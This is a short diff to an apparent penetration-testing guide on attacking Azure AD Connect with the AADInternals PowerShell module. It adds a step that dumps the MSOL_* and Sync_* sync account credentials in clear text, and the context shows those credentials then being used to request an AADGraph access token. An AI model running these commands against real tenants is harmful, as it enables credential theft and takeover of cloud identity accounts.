@@ -1516,6 +1516,12 @@ Expand-Archive C:\Users\Administrator\Documents\AADInternals.0.4.5.zip -Destinat
 Import-Module C:\Users\Administrator\Documents\AADInternals\AADInternals.psd1
 ```
 
+Extract credentials of the MSOL_* and Sync_* accounts in clear-text:
+```
+Get-AADIntSyncCredentials
+```
+
+
 Use the credentials of the Sync_* account to request an access token for AADGraph API and save it to cache:
 ```
 $passwd = ConvertTo-SecureString 'password' -AsPlainText -Force 
